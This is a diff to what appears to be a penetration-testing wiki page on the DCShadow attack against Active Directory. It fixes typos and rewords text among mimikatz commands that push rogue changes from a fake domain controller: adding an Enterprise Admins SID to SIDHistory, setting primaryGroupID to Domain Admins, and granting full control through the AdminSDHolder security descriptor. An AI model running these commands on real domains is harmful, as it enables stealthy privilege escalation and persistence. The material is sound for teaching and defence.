@@ -45,13 +45,13 @@ For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
 
-```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
+```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
 
 ```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
-(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
@@ -96,9 +96,9 @@ We need to append following ACEs with our user's SID at the end:<sup>[[2]](#refe
 - On the target user object: `(A;;WP;;;UserSID)`
 - On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
+In this case you need to make **several changes**, not just one. In the **mimikatz1 session** (RPC server), use the **`/stack` parameter with each change**. You then need to **`/push`** only once to apply all stacked changes from the rogue server.
 
 [**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>
 
